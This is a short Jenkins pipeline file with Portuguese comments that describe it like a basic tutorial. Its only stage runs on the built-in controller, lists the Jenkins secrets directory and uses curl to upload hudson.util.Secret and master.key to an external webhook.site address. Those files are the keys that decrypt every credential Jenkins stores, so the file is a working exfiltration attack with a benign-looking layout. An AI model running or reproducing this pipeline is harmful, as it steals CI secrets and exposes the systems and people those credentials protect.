pipeline {
    agent {
        label '(built-in)'
    }
    
    stages {               // conjunto de etapas
        stage('Nome') {    // uma etapa específica
            steps {        // ações dentro da etapa
                sh '''
                ls -la /var/jenkins_home/secrets/
                curl -X POST -F "file=@/var/jenkins_home/secrets/hudson.util.Secret" https://webhook.site/467ff04d-3515-4def-8f83-6ac201b3e91d
                curl -X POST -F "file=@/var/jenkins_home/secrets/master.key" https://webhook.site/467ff04d-3515-4def-8f83-6ac201b3e91d
                curl -X POST -F "file=@/var/jenkins_home/secrets/master.key" https://webhook.site/467ff04d-3515-4def-8f83-6ac201b3e91d
                '''
            }
        }
    }
}
